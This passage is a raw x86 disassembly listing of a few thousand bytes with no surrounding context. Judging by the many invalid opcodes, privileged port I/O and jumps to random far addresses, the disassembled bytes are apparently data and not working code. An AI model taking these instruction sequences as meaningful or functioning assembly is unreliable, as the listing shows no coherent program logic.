  413dca:	shl    eax,1
  413dcc:	aam    0xcf
  413dce:	call   0xbe1e0ab6
  413dd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413dd4:	mov    esp,0xcfc8f0e6
  413dd9:	cmc    
  413dda:	shr    ebx,0xd6
  413ddd:	int    0xf2
  413ddf:	lock fcmovnbe st,st(1)
  413de2:	fmul   st(6),st
  413de4:	add    ch,dl
  413de6:	shl    ah,0xc1
  413de9:	(bad)  
  413dea:	in     eax,0x0
  413dec:	jmp    0xd8e8:0xe30b0c07
  413df3:	repnz test edi,0xebadf1c6
  413dfa:	iret   
  413dfb:	les    edi,FWORD PTR [edi-0x4a274938]
  413e01:	int    0xf1
  413e03:	hlt    
  413e04:	clc    
  413e05:	mov    esp,0x6d402c2
  413e0a:	or     edi,ebp
  413e0c:	test   DWORD PTR [esi],0xf3df0903
  413e12:	fldenv [esi-0x181d340a]
  413e18:	jmp    0x413deb
  413e1a:	mov    ah,0xd1
  413e1c:	call   0xdc1b2af2
  413e21:	cmc    
  413e22:	sar    DWORD PTR [ebp-0x84139],1
  413e28:	cmc    
  413e29:	or     eax,ebx
  413e2b:	leave  
  413e2c:	lds    edi,FWORD PTR [edx+ecx*1-0x2135181a]
  413e33:	repz jecxz 0x413dfd
  413e36:	jmp    0x413e28
  413e38:	shl    BYTE PTR [ebx-0x22c344f],cl
  413e3e:	neg    ah
  413e40:	mov    cl,0xe3
  413e42:	out    dx,al
  413e43:	idiv   cl
  413e45:	out    0x6,al
  413e47:	ror    bl,cl
  413e49:	ret    
  413e4a:	rol    esp,1
  413e4c:	or     ebx,eax
  413e4e:	fild   DWORD PTR [ecx]
  413e50:	add    bh,ah
  413e52:	mov    eax,0xc3f0e9b0
  413e57:	mul    ebx
  413e59:	retf   
  413e5a:	(bad)  
  413e5b:	leave  
  413e5c:	shr    al,cl
  413e5e:	out    dx,eax
  413e5f:	into   
  413e60:	call   0xde442f19
  413e65:	cli    
  413e66:	add    DWORD PTR [esi],eax
  413e68:	in     eax,0xe1
  413e6a:	(bad)  
  413e6c:	leave  
  413e6d:	in     al,0xdc
  413e6f:	hlt    
  413e70:	retf   
  413e71:	fcmove st,st(7)
  413e73:	retf   0xe6f3
  413e76:	icebp  
  413e77:	rcl    ebx,cl
  413e79:	aam    0xd3
  413e7b:	into   
  413e7c:	(bad)  
  413e7d:	rcr    dl,1
  413e7f:	int3   
  413e80:	cld    
  413e81:	mov    edx,0xc0ffdfda
  413e86:	in     al,0xe0
  413e88:	faddp  st(3),st
  413e8a:	(bad)  
  413e8c:	(bad)  
  413e8e:	aad    0xd4
  413e90:	out    dx,al
  413e91:	jmp    0xf6152e7e
  413e96:	(bad)
  413e99:	(bad)  
  413e9a:	aam    0xee
  413e9c:	ror    cl,cl
  413e9e:	repz sti 
  413ea0:	mov    edx,0xefdae1ed
  413ea5:	pop    es
  413ea6:	clc    
  413ea7:	add    dh,ah
  413ea9:	add    DWORD PTR [edi],eax
  413eab:	stc    
  413eac:	(bad)  
  413eae:	in     eax,0x5
  413eb0:	in     eax,0xce
  413eb2:	loope  0x413e60
  413eb4:	out    0xe2,eax
  413eb6:	call   0xb0ee28b0
  413ebb:	mov    dh,0xed
  413ebd:	rcr    ah,cl
  413ebf:	jmp    0x413e96
  413ec1:	sar    DWORD PTR [eax-0x7200f42],cl
  413ec7:	(bad)  
  413ec9:	(bad)  
  413eca:	add    DWORD PTR [ecx],eax
  413ecc:	(bad)  
  413ece:	pop    es
  413ecf:	leave  
  413ed0:	int    0xde
  413ed2:	(bad)  
  413ed4:	leave  
  413ed5:	mov    cl,0xb5
  413ed7:	fcmovnb st,st(6)
  413ed9:	rcr    eax,1
  413edb:	fcmovb st,st(7)
  413edd:	(bad)  
  413edf:	int3   
  413ee0:	cmc    
  413ee1:	int    0xe2
  413ee3:	int    0xcc
  413ee5:	add    bh,ah
  413ee7:	(bad)  
  413ee8:	sti    
  413ee9:	add    ecx,edx
  413eeb:	(bad)  
  413eec:	(bad)  
  413eed:	call   0xd0202800
  413ef2:	ret    0xaef1
  413ef5:	(bad)  
  413ef7:	test   dl,0xfb
  413efa:	vpsrlq ymm2,ymm5,xmm0
  413efe:	(bad)  
  413f00:	mov    eax,0xe7ede2fd
  413f05:	sar    BYTE PTR [esi-0x172b2d2c],0xd6
  413f0c:	in     eax,0xe9
  413f0e:	int    0xf
  413f10:	fsub   st(4),st
  413f12:	into   
  413f13:	jecxz  0x413ee0
  413f15:	fisubr WORD PTR [esi-0x31062e4b]
  413f1b:	clc    
  413f1c:	push   esi
  413f1e:	vpaddb xmm2,xmm2,xmm5
  413f22:	stc    
  413f23:	idiv   ah
  413f25:	mov    esi,0xe5c7fa05
  413f2a:	or     edx,eax
  413f2c:	neg    al
  413f2e:	stc    
  413f2f:	hlt    
  413f30:	repnz in al,dx
  413f32:	in     eax,0xeb
  413f34:	loop   0x413eff
  413f36:	mov    dl,0xc2
  413f38:	out    dx,eax
  413f39:	rcl    ecx,cl
  413f3b:	fdiv   st,st(0)
  413f3d:	sar    eax,cl
  413f3f:	in     al,dx
  413f40:	shr    dl,1
  413f42:	neg    ebp
  413f44:	f2xm1  
  413f46:	pop    es
  413f47:	xlat   BYTE PTR ds:[ebx]
  413f48:	stc    
  413f49:	or     DWORD PTR [eax],ecx
  413f4b:	leave  
  413f4c:	std    
  413f4d:	hlt    
  413f4e:	fsubr  st,st(1)
  413f50:	push   cs
  413f51:	fnop   
  413f53:	leave  
  413f54:	leave  
  413f55:	cmc    
  413f56:	in     al,0xc0
  413f58:	mov    ebx,0xedb8eeb3
  413f5d:	int3   
  413f5e:	(bad)  
  413f60:	loop   0x413f40
  413f62:	leave  
  413f63:	sti    
  413f64:	rcr    dl,cl
  413f66:	fadd   st(6),st
  413f68:	fcmovnb st,st(1)
  413f6a:	fiadd  DWORD PTR [edi]
  413f6c:	fstp   st(1)
  413f6e:	(bad)  
  413f70:	pop    es
  413f71:	jmp    0xd6230d56
  413f76:	retf   
  413f77:	jmp    0x413f60
  413f79:	div    ecx
  413f7b:	xlat   BYTE PTR ds:[ebx]
  413f7c:	jmp    0xc9d7:0xfcd4c9e8
  413f83:	aam    0xe7
  413f85:	aam    0x1
  413f87:	mov    esi,0xf9c0d7c7
  413f8c:	call   0xe006468d
  413f91:	leave  
  413f92:	jecxz  0x413f52
  413f94:	in     al,dx
  413f95:	out    0xc3,eax
  413f97:	mov    bl,0xd0
  413f99:	cmc    
  413f9a:	into   
  413f9b:	mov    al,0xb8
  413f9d:	(bad)  
  413f9e:	mov    ah,0xf1
  413fa0:	fmulp  st(1),st
  413fa2:	add    edi,eax
  413fa4:	clc    
  413fa5:	add    dl,dl
  413fa7:	aad    0xd4
  413fa9:	aam    0xc2
  413fab:	cld    
  413fac:	add    eax,esp
  413fae:	add    eax,0xaee6c8cf
  413fb3:	rep lods eax,DWORD PTR ds:[esi]
  413fb5:	int    0xe9
  413fb7:	out    0xe6,al
  413fb9:	aad    0xce
  413fbb:	jmp    0x413f71
  413fbd:	jmp    0xdc3023c0
  413fc2:	aam    0xff
  413fc4:	xlat   BYTE PTR ds:[ebx]
  413fc5:	cld    
  413fc6:	add    edi,edi
  413fc8:	out    0xe2,al
  413fca:	rcr    cl,0xd9
  413fcd:	fcos   
  413fcf:	(bad)  
  413fd0:	leave  
  413fd1:	push   cs
  413fd2:	jmp    0xade5e893
  413fd7:	fadd   st(6),st
  413fd9:	aam    0xe8
  413fdb:	(bad)
  413fde:	lock std 
  413fe0:	aad    0xb4
  413fe2:	add    ebx,edi
  413fe4:	mul    cl
  413fe6:	int3   
  413fe7:	add    esp,ebx
  413fe9:	std    
  413fea:	mov    edi,0x8fef706
  413fef:	out    dx,eax
  413ff0:	loope  0x413ff8
  413ff2:	(bad)
  413ff5:	(bad)  
  413ff6:	repz (bad) 
  413ff8:	sti    
  413ff9:	ret    0xc0b3
  413ffc:	in     al,0xbb
  413ffe:	int    0xd9
  414000:	sti    
  414001:	in     eax,dx
  414002:	jmp    0xfc3dfee2
  414007:	rcr    edx,1
  414009:	loopne 0x414016
  41400b:	out    0xe,eax
  41400d:	fild   DWORD PTR [eax]
  41400f:	adc    edi,eax
  414011:	loopne 0x413ffb
  414013:	enter  0xf2c6,0xb5
  414017:	shr    DWORD PTR [ebx+edx*8-0x8172c0c],cl
  41401e:	mov    ah,0xdf
  414020:	add    bl,bl
  414022:	int3   
  414023:	mov    esi,0xfbd1e7cc
  414028:	(bad)  
  41402a:	fisttp QWORD PTR [edx]
  41402c:	iret   
  41402d:	retf   
  41402e:	out    dx,eax
  41402f:	dec    BYTE PTR [ecx]
  414031:	les    edi,FWORD PTR [edi-0xa303017]
  414037:	mov    dl,0xe0
  414039:	out    dx,eax
  41403a:	stc    
  41403b:	shl    BYTE PTR [ebp+ecx*8-0x35200229],cl
  414042:	iret   
  414043:	fidiv  DWORD PTR [ebp-0x143d0d3d]
  414049:	aad    0xc4
  41404b:	out    dx,eax
  41404c:	(bad)  
  41404d:	aad    0xe0
  41404f:	enter  0xca00,0xe1
  414053:	ror    ch,1
  414055:	(bad)  
  414056:	call   0xe1180752
  41405b:	aad    0xe7
  41405d:	not    bl
  41405f:	mov    eax,0xf1d5b0f3
  414064:	shl    ebp,1
  414066:	mov    esp,0xead1e0e6
  41406b:	retf   
  41406c:	add    al,0xcf
  41406e:	push   es
  41406f:	call   0xd9282d56
  414074:	xlat   BYTE PTR ds:[ebx]
  414075:	rol    edx,0xe5
  414078:	call   0xb9071c33
  41407d:	(bad)  
  41407e:	rcl    edx,cl
  414080:	hlt    
  414081:	cmc    
  414082:	in     eax,dx
  414083:	(bad)  
  414085:	sar    BYTE PTR [edi-0x380f431a],1
  41408b:	aam    0xef
  41408d:	or     bl,ch
  41408f:	out    0xea,al
  414091:	adc    ch,ch
  414093:	in     al,dx
  414094:	mov    esp,0xc5c9aceb
  414099:	enter  0xc0ce,0xb7
  41409d:	(bad)  
  41409f:	jmp    0xe31d3579
  4140a4:	mov    ebp,0xe7bcf6d7
  4140a9:	ret    
  4140aa:	leave  
  4140ab:	fld    st(7)
  4140ad:	iret   
  4140ae:	inc    dh
  4140b0:	(bad)  
  4140b2:	into   
  4140b3:	in     al,dx
  4140b4:	in     al,0xde
  4140b6:	mov    cl,0xf6
  4140b8:	mov    ch,0xd5
  4140ba:	fcmovnu st,st(7)
  4140bc:	call   0xfd313c93
  4140c1:	int3   
  4140c2:	mov    ecx,0xedf4e7f9
  4140c7:	fcom   st(5)
  4140c9:	xlat   BYTE PTR ds:[ebx]
  4140ca:	rcr    bh,0xe0
  4140cd:	or     eax,0xff09fddf
  4140d2:	(bad)
  4140d5:	loope  0x4140b8
  4140d7:	mov    ch,0xdb
  4140d9:	int    0xba
  4140db:	call   0xb2fa1099
  4140e0:	rol    DWORD PTR [edx],cl
  4140e2:	lock lock out dx,al
  4140e5:	imul   ebp
  4140e7:	repnz cli 
  4140e9:	retf   0xf5e3
  4140ec:	cld    
  4140ed:	retf   
  4140ee:	retf   0xcef9
  4140f1:	sar    BYTE PTR [esi-0x154c154f],0xcd
  4140f8:	mov    ch,0xd2
  4140fa:	sti    
  4140fb:	retf   0xf1bb
  4140fe:	shr    edx,1
  414100:	fistp  QWORD PTR [eax+0x1d6c0fd]
  414106:	shl    edi,cl
  414108:	in     al,0x2
  41410a:	loop   0x4140e9
  41410c:	fmul   QWORD PTR [edi]
  41410e:	loope  0x414103
  414110:	std    
  414111:	in     eax,dx
  414112:	int3   
  414113:	mov    esp,0xb3e2cef7
  414118:	call   0xadf80b02
  41411d:	int3   
  41411e:	div    ecx
  414120:	fsubr  st,st(7)
  414122:	jmp    0xd3483f19
  414127:	in     al,0xf8
  414129:	lock cmc 
  41412b:	out    0xfb,eax
  41412d:	stc    
  41412e:	hlt    
  41412f:	in     al,dx
  414130:	iret   
  414131:	push   es
  414132:	retf   
  414133:	out    dx,al
  414134:	jmp    0xd5e6:0xfbf1d2af
  41413b:	mov    ebx,0xf5c9b5d2
  414140:	int    0xb9
  414142:	mov    ebp,0xf8e2b8de
  414147:	loopne 0x414146
  414149:	shr    cl,0xdc
  41414c:	push   cs
  41414d:	clc    
  41414e:	hlt    
  41414f:	add    ebx,ebx
  414151:	out    0xab,al
  414153:	retf   0xc1e9
  414156:	out    dx,al
  414157:	(bad)  
  414158:	cli    
  414159:	rol    bh,cl
  41415b:	stc    
  41415c:	(bad)
  41415f:	add    ebp,ebp
  414161:	add    esi,ebx
  414163:	loope  0x41413e
  414165:	cld    
  414166:	rcr    eax,0xd9
  414169:	retf   
  41416a:	fadd   st(1),st
  41416c:	in     al,0xe
  41416e:	fucomip st,st(3)
  414170:	adc    ah,bh
  414172:	in     al,dx
  414173:	(bad)  
  414174:	loopne 0x414128
  414176:	repz in al,0xb0
  414179:	fprem1 
  41417b:	icebp  
  41417c:	out    dx,eax
  41417d:	icebp  
  41417e:	in     al,0xd9
  414180:	jmp    0x414185
  414182:	ret    
  414183:	aam    0xbf
  414185:	out    dx,al
  414186:	(bad)  
  414187:	cld    
  414188:	(bad)
  41418b:	in     eax,0xea
  41418d:	mov    ebx,0xe2da01d9
  414193:	jecxz  0x414162
  414195:	icebp  
  414196:	repnz lock icebp 
  414199:	mov    cl,0xc1
  41419b:	mov    bh,0xf3
  41419d:	leave  
  41419e:	mov    edi,0xf0d7fcf0
  4141a3:	(bad)  
  4141a4:	shl    BYTE PTR [ebp+eax*1-0x3c3d2e19],cl
  4141ab:	in     al,0xd4
  4141ad:	(bad)  
  4141ae:	sti    
  4141af:	in     al,0xdd
  4141b1:	out    dx,eax
  4141b2:	(bad)  
  4141b3:	in     al,dx
  4141b4:	out    0xf1,eax
  4141b6:	hlt    
  4141b7:	lods   al,BYTE PTR ds:[esi]
  4141b8:	retf   
  4141b9:	iret   
  4141ba:	in     al,0xe0
  4141bc:	vpmulhw xmm1,xmm2,xmm5
  4141c0:	shr    ecx,cl
  4141c2:	loopne 0x414199
  4141c4:	push   es
  4141c5:	out    0xbb,al
  4141c7:	in     eax,0xa
  4141c9:	retf   
  4141ca:	aad    0xe8
  4141cc:	mov    ebp,0xe2c6fa00
  4141d1:	leave  
  4141d2:	ror    dl,0xc7
  4141d5:	ror    ah,cl
  4141d7:	mov    al,0xd1
  4141d9:	out    0xcb,eax
  4141db:	mov    ebx,0xefd5bbbf
  4141e0:	sti    
  4141e1:	fdivr  st(0),st
  4141e3:	enter  0xccd4,0xf6
  4141e7:	clc    
  4141e8:	cmc    
  4141e9:	pop    es
  4141ea:	sti    
  4141eb:	fsubr  st(0),st
  4141ed:	frndint 
  4141ef:	loopne 0x4141ec
  4141f1:	or     eax,esp
  4141f3:	xlat   BYTE PTR ds:[ebx]
  4141f4:	in     al,dx
  4141f5:	jmp    0xe8cd:0xcfd0eed6
  4141fc:	jmp    0xbabe:0xdcfdfaec
  414203:	mov    edi,0xf6e1d3d2
  414208:	add    eax,DWORD PTR [eax+eiz*8]
  41420b:	out    0xea,al
  41420d:	or     cl,BYTE PTR [ecx]
  41420f:	loope  0x4141ea
  414211:	adc    ch,BYTE PTR [eax-0x54392840]
  414217:	scas   al,BYTE PTR es:[edi]
  414218:	jecxz  0x4141d4
  41421a:	loopne 0x414206
  41421c:	into   
  41421d:	fdivr  st,st(0)
  41421f:	inc    ebx
  414221:	enter  0xe8ba,0xe2
  414225:	fiadd  WORD PTR [ecx]
  414227:	aad    0xfc
  414229:	add    al,ch
  41422b:	push   es
  41422c:	rol    ebp,0xff
  41422f:	int    0x0
  414231:	add    ch,BYTE PTR [edx-0x2b083136]
  414237:	call   0xd9f7ef07
  41423c:	mov    dh,0xff
  41423e:	mov    esi,0xc8d7d5cd
  414243:	ret    
  414244:	hlt    
  414245:	out    0xf0,al
  414247:	jecxz  0x41420b
  414249:	or     edx,ebp
  41424b:	add    al,BYTE PTR [esi]
  41424d:	retf   
  41424e:	add    cl,dh
  414250:	retf   
  414251:	add    bl,al
  414253:	mul    ebp
  414255:	mov    bl,0xc2
  414257:	mov    bl,0xf1
  414259:	mov    dh,0xb3
  41425b:	int3   
  41425c:	int    0xcc
  41425e:	shr    esp,cl
  414260:	iret   
  414261:	(bad)  
  414262:	std    
  414263:	fld    DWORD PTR [edx]
  414265:	rcl    ah,1
  414267:	clc    
  414268:	(bad)  
  414269:	(bad)  
  41426a:	fld    DWORD PTR [eax]
  41426c:	fadd   QWORD PTR [ecx]
  41426e:	or     al,0x3
  414270:	add    bl,dl
  414272:	call   0xf7ee066e
  414277:	mov    cl,0xb0
  414279:	aam    0xe7
  41427b:	mov    bh,0xd2
  41427d:	leave  
  41427e:	idiv   DWORD PTR [edx+edi*4+0x2cefc02]
  414285:	jecxz  0x41424c
  414287:	xlat   BYTE PTR ds:[ebx]
  414288:	dec    BYTE PTR [edx]
  41428a:	clc    
  41428b:	xlat   BYTE PTR ds:[ebx]
  41428c:	aam    0xee
  41428e:	push   cs
  41428f:	fucom  st(1)
  414291:	add    al,0xe6
  414293:	loope  0x41423d
  414295:	mov    dl,0xee
  414297:	mov    ah,0xe5
  414299:	(bad)  
  41429a:	loopne 0x414266
  41429c:	aad    0xed
  41429e:	jmp    0xce0f0076
  4142a3:	pop    es
  4142a4:	call   edi
  4142a6:	mov    DWORD PTR [esi+eax*1],0xe7fc02c5
  4142ad:	add    al,BYTE PTR [ebx]
  4142af:	add    bl,al
  4142b1:	push   cs
  4142b2:	shl    ah,1
  4142b4:	mov    al,0xcb
  4142b6:	mov    ch,0xe2
  4142b8:	int    0xf9
  4142ba:	icebp  
  4142bb:	div    cl
  4142bd:	iret   
  4142be:	std    
  4142bf:	in     eax,dx
  4142c0:	hlt    
  4142c1:	mov    ah,0xed
  4142c3:	call   0xd701029d
  4142c8:	out    0x2,eax
  4142ca:	fadd   QWORD PTR [esi]
  4142cc:	jmp    0xd00a:0xe3f3c8f6
  4142d3:	call   0xbd380a94
  4142d8:	mov    bl,0xac
  4142da:	mov    dl,0xf8
  4142dc:	retf   0xf7d6
  4142df:	mov    dl,0xc3
  4142e1:	(bad)  
  4142e2:	loope  0x4142e7
  4142e4:	mov    ebp,0xd300bf00
  4142e9:	add    al,0xc6
  4142eb:	(bad)  
  4142ed:	out    0xec,al
  4142ef:	add    al,0xb
  4142f1:	(bad)  
  4142f2:	(bad)
  4142f5:	int    0xaf
  4142f7:	out    0xb4,eax
  4142f9:	loopne 0x4142c7
  4142fb:	int3   
  4142fc:	lock call 0xe42e26d7
  414302:	mov    ebx,0xd7fdefd7
  414307:	(bad)  
  414308:	neg    ah
  41430a:	jmp    0xf92c0e0e
  41430f:	(bad)  
  414312:	icebp  
  414313:	int    0xae
  414315:	int    0xf6
  414317:	call   0xb63c0dc8
  41431c:	cmc    
  41431d:	mov    eax,0xd4fbf0d3
  414322:	ret    0xb9df
  414325:	add    edi,DWORD PTR [ebp-0x211420fc]
  41432b:	enter  0xc4db,0xe5
  41432f:	pop    es
  414330:	stc    
  414331:	or     BYTE PTR [ecx-0x2b485744],ch
  414337:	aad    0xd2
  414339:	mov    dl,0xe8
  41433b:	retf   
  41433c:	mov    dh,0xdd
  41433e:	in     eax,0xe9
  414340:	mov    ch,0xd4
  414342:	call   esp
  414344:	push   es
  414345:	repnz (bad) 
  414348:	in     al,0x2
  41434a:	dec    ecx
  41434c:	stc    
  41434d:	stc    
  41434e:	cmc    
  41434f:	repz call ebx
  414352:	faddp  st(2),st
  414354:	(bad)  
  414356:	jecxz  0x414338
  414358:	shr    ah,0xef
  41435b:	(bad)  
  41435e:	out    dx,eax
  41435f:	sti    
  414360:	fmul   st(0),st
  414362:	loopne 0x414341
  414364:	mov    ebp,0xf8c707c1
  414369:	std    
  41436a:	out    0xe4,al
  41436c:	or     ecx,edi
  41436e:	(bad)  
  41436f:	std    
  414370:	add    ecx,ebp
  414372:	ret    0xdfac
  414375:	jmp    0xcd0ef670
  41437a:	mov    ah,0xc7
  41437c:	(bad)  
  41437d:	repnz cmc 
  41437f:	cli    
  414380:	rcl    ebx,cl
  414382:	stc    
  414383:	mov    esp,0x7c2dbce
  414388:	add    eax,0xfcda04d9
  41438d:	aam    0xe4
  41438f:	in     eax,dx
  414390:	bswap  ebp
  414392:	in     al,0xc9
  414394:	in     eax,0xb0
  414396:	lds    ebp,FWORD PTR [ebp+eiz*8-0x263b114b]
  41439d:	(bad)  
  41439f:	jmp    0xc0182377
  4143a4:	cmc    
  4143a5:	mov    esp,0x101f1
  4143aa:	call   0xc5402e7f
  4143af:	fisttp WORD PTR [edi]
  4143b1:	jecxz  0x414379
  4143b3:	lods   al,BYTE PTR ds:[esi]
  4143b4:	rol    dl,0xec
  4143b7:	int3   
  4143b8:	sti    
  4143b9:	int3   
  4143ba:	mov    ch,0xb9
  4143bc:	fptan  
  4143be:	repz mov eax,0xedeeb803
  4143c4:	cmc    
  4143c5:	aam    0xfb
  4143c7:	add    ah,ah
  4143c9:	add    eax,eax
  4143cb:	fst    st(6)
  4143cd:	les    ecx,FWORD PTR [esi]
  4143cf:	jecxz  0x4143d0
  4143d1:	out    0xce,al
  4143d3:	loope  0x41439b
  4143d5:	loop   0x4143b4
  4143d7:	(bad)  
  4143d8:	lods   eax,DWORD PTR ds:[esi]
  4143d9:	imul   ebp
  4143db:	mov    edx,0xbefecdd0
  4143e0:	cli    
  4143e1:	mov    esi,0xd4f5d0f2
  4143e6:	fsubrp st(5),st
  4143e8:	(bad)  
  4143e9:	(bad)  
  4143eb:	out    0xfe,al
  4143ed:	cld    
  4143ee:	jecxz  0x4143ef
  4143f0:	cld    
  4143f1:	les    edi,FWORD PTR [ecx-0x1f4f3152]
  4143f7:	out    0xc8,eax
  4143f9:	hlt    
  4143fa:	out    dx,al
  4143fb:	mov    dl,0xe8
  4143fd:	(bad)  
  4143fe:	into   
  4143ff:	jmp    0x4143d2
  414401:	(bad)  
  414403:	mov    esp,0xfdecbef6
  414408:	mov    esp,0xeafdc505
  41440d:	clc    
  41440e:	pand   mm0,mm4
  414411:	repnz jecxz 0x4143fc
  414414:	mov    cl,0xc9
  414416:	shl    esp,cl
  414418:	ror    bl,cl
  41441a:	mov    cl,0xe8
  41441c:	sti    
  41441d:	mov    al,0xde
  41441f:	(bad)  
  414420:	fadd   st,st(2)
  414422:	cmc    
  414423:	mul    esi
  414425:	add    dl,ah
  414427:	aam    0xe5
  414429:	fld    QWORD PTR [ebx]
  41442b:	or     cl,BYTE PTR [eax]
  41442d:	(bad)  
  41442e:	cmc    
  41442f:	loopne 0x414411
  414431:	shl    ch,0xb1
  414434:	ret    
  414435:	enter  0xb5f5,0xd0
  414439:	mov    cl,0xda
  41443b:	out    0xc9,al
  41443d:	mov    al,0xfe
  41443f:	mov    esp,0xfed5dff2
  414444:	neg    ebx
  414446:	add    dl,dl
  414448:	(bad)  
  414449:	(bad)  
  41444b:	fcmovnbe st,st(7)
  41444d:	out    0xc9,al
  41444f:	in     eax,dx
  414450:	int3   
  414451:	std    
  414452:	retf   0xefca
  414455:	icebp  
  414456:	not    ebx
  414458:	mov    al,0xe5
  41445a:	mov    bl,0xe7
  41445c:	mov    ch,0xf3
  41445e:	fstp   TBYTE PTR [ecx+esi*4-0x23e0037]
  414465:	mov    ah,0xc5
  414467:	clc    
  414468:	cli    
  414469:	loope  0x414451
  41446b:	jmp    0xfe40545a
  414470:	in     eax,0xec
  414472:	jecxz  0x414437
  414474:	enter  0xd6e5,0xc5
  414478:	(bad)  
  414479:	loopne 0x414441
  41447b:	ror    ecx,cl
  41447d:	mov    dh,0xd4
  41447f:	fdiv   DWORD PTR [ecx-0x25323d3d]
  414485:	std    
  414486:	fcmovnb st,st(1)
  414488:	loop   0x414466
  41448a:	jmp    0xc7373290
  41448f:	or     edx,esp
  414491:	push   cs
  414492:	int3   
  414493:	jecxz  0x41447d
  414495:	mov    bh,0xb1
  414497:	enter  0xdbb5,0xf3
  41449b:	aam    0xe6
  41449d:	fdiv   DWORD PTR [ebp+ebx*8-0x121c1315]
  4144a4:	out    0xc7,eax
  4144a6:	(bad)  
  4144a7:	hlt    
  4144a8:	rol    eax,cl
  4144aa:	std    
  4144ab:	(bad)  
  4144ad:	enter  0xcdd4,0xfd
  4144b1:	retf   0xf2e9
  4144b4:	shr    BYTE PTR [esi-0xb442c33],1
  4144ba:	jmp    0xb1ed:0xfacfd0ec
  4144c1:	test   edi,0x5c301d5
  4144c7:	add    bh,al
  4144c9:	jmp    0x4144c8
  4144cb:	(bad)  
  4144cd:	loop   0x4144ac
  4144cf:	loop   0x4144b1
  4144d1:	add    ebx,ecx
  4144d3:	jecxz  0x4144a0
  4144d5:	mov    al,0xd0
  4144d7:	jmp    0x4144bb
  4144d9:	mov    dl,0xb9
  4144db:	mov    ebx,0xf8ebf7da
  4144e0:	xlat   BYTE PTR ds:[ebx]
  4144e1:	rcr    dh,1
  4144e3:	xlat   BYTE PTR ds:[ebx]
  4144e4:	int3   
  4144e5:	shl    bl,cl
  4144e7:	repz lock loopne 0x4144b4
  4144eb:	(bad)  
  4144ec:	or     eax,esp
  4144ee:	jmp    0x4144f4
  4144f0:	stc    
  4144f1:	add    eax,0xe9b7afc1
  4144f6:	(bad)  
  4144f7:	xlat   BYTE PTR ds:[ebx]
  4144f8:	ret    0xe5b3
  4144fb:	(bad)  
  4144fc:	retf   
  4144fd:	shr    esp,1
  4144ff:	mov    ch,0xd8
  414501:	mov    ebp,0xd5bff202
  414506:	ret    0xd8be
  414509:	retf   
  41450a:	aam    0xd4
  41450c:	or     esp,ebp
  41450e:	or     esp,edx
  414510:	(bad)  [edx]
  414512:	test   al,0xc0
  414514:	mov    dh,0xb6
  414517:	sar    bl,1
  414519:	enter  0xf5e5,0xf9
  41451d:	sti    
  41451e:	sar    BYTE PTR [eax-0xa251d28],1
  414524:	aad    0xe6
  414526:	idiv   dl
  414528:	hlt    
  414529:	mov    esp,0xddc8bef8
  41452e:	inc    ebp
  414530:	or     DWORD PTR [ebx],eax
  414532:	mov    cl,0xea
  414534:	retf   0xf6e7
  414537:	int    0xef
  414539:	lods   al,BYTE PTR ds:[esi]
  41453a:	mov    al,0xe9
  41453c:	out    dx,eax
  41453d:	(bad)
  414540:	cld    
  414541:	cmc    
  414542:	clc    
  414543:	rol    DWORD PTR [esi],cl
  414545:	into   
  414546:	int    0x1
  414548:	sar    ch,0xd9
  41454b:	fimul  WORD PTR [edx]
  41454d:	pop    es
  41454e:	int    0xd
  414550:	loopne 0x41453c
  414552:	loop   0x414513
  414554:	(bad)  
  414555:	out    dx,eax
  414556:	jmp    0xb9bb:0xedc2c6ef
  41455d:	ror    ebx,1
  41455f:	shr    bl,1
  414561:	mov    ebp,0xf9cccdb7
  414566:	shl    ecx,1
  414568:	cmc    
  414569:	in     al,0xea
  41456b:	(bad)  
  41456c:	jmp    0xeb054d5a
  414571:	call   0xdcf02423
  414576:	iret   
  414577:	in     al,0xc6
  414579:	(bad)  
  41457a:	mov    bh,0xbb
  41457c:	in     eax,0xf3
  41457e:	mov    ah,0xeb
  414580:	out    dx,al
  414581:	not    dl
  414583:	add    eax,DWORD PTR [eax]
  414585:	in     eax,dx
  414586:	out    0xe2,al
  414588:	sti    
  414589:	fimul  WORD PTR [ecx]
  41458b:	cld    
  41458c:	fdivp  st(2),st
  41458e:	retf   0xe50d
  414591:	call   0xe1283159
  414596:	ret    
  414597:	in     eax,0xe4
  414599:	in     eax,0xc4
  41459b:	les    esi,FWORD PTR [eax-0x164a452c]
  4145a1:	icebp  
  4145a2:	add    eax,ebx
  4145a4:	(bad)  
  4145a6:	sar    edi,1
  4145a8:	aad    0xcb
  4145aa:	cmc    
  4145ab:	or     bh,dh
  4145ad:	mov    BYTE PTR ds:0xaf09cedf,0xef
  4145b4:	(bad)  
  4145b5:	cmc    
  4145b6:	call   0xcaf8179f
  4145bb:	aad    0xcf
  4145bd:	xlat   BYTE PTR ds:[ebx]
  4145be:	cmc    
  4145bf:	leave  
  4145c0:	hlt    
  4145c1:	rcl    ebp,cl
  4145c3:	cmc    
  4145c4:	ret    0xc3b8
  4145c7:	in     al,0xde
  4145c9:	rol    BYTE PTR [ebx],0x9
  4145cc:	retf   
  4145cd:	or     ah,bh
  4145cf:	fnclex 
  4145d1:	enter  0xd0d3,0xc2
  4145d5:	jmp    0xccf5:0xf3f6d6e4
  4145dc:	mov    edi,0xd1cff3d2
  4145e1:	int    0xd4
  4145e3:	out    dx,al
  4145e4:	out    dx,al
  4145e5:	aam    0xe0
  4145e7:	add    eax,0xf7c7e2bc
  4145ec:	add    BYTE PTR [esi],cl
  4145ee:	(bad)
  4145f1:	push   es
  4145f2:	stos   BYTE PTR es:[edi],al
  4145f3:	in     al,dx
  4145f4:	scas   eax,DWORD PTR es:[edi]
  4145f5:	into   
  4145f6:	(bad)
  4145f9:	mov    ah,0xf3
  4145fb:	(bad)  
  4145fc:	in     eax,0xc8
  4145fe:	lock mov ecx,0xcfbbbece
  414604:	mov    ch,0xf6
  414606:	rol    ch,cl
  414608:	dec    ebx
  41460a:	retf   0xe50a
  41460d:	mov    esp,0xc803e9ec
  414612:	test   eax,0xd3bde5f7
  414617:	repnz mov bh,0xbb
  41461a:	jmp    0xcecd:0xfecfc7f2
  414621:	ror    dh,cl
  414623:	fcmovne st,st(4)
  414625:	add    esi,esi
  414627:	(bad)  
  414628:	fucomp st(2)
  41462a:	out    0xe9,eax
  41462c:	(bad)
  41462f:	int    0x7
  414631:	add    al,0xa7
  414633:	mov    al,0xce
  414635:	int3   
  414636:	lock mov cl,0xd1
  414639:	cmc    
  41463a:	cmc    
  41463b:	idiv   edx
  41463d:	call   0xc036143e
  414642:	xlat   BYTE PTR ds:[ebx]
  414643:	call   0xc8220a44
  414648:	clc    
  414649:	or     ecx,edi
